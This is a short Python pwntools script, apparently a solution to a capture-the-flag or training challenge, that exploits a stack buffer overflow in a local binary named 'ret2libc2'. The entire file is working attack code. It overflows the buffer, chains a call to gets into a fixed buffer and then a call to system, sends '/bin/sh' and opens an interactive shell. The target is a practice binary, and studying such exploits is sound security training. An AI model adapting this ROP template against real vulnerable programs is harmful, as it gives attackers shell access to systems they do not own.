from pwn import *

file_path = "./ret2libc2"
sh = process(file_path)
file = ELF(file_path)
gets_plt = file.plt["gets"]
system_plt = file.plt["system"]
pop_ebx_ret_addr = 0x0804843D
buf2_addr = 0x0804A080
offset = 0x6C + 4
payload = flat(
    [
        b"a" * offset,
        gets_plt,
        pop_ebx_ret_addr,
        buf2_addr,
        system_plt,
        0xDEADBEEF,
        buf2_addr,
    ]
)
sh.sendline(payload)
sh.sendline("/bin/sh")
sh.interactive()
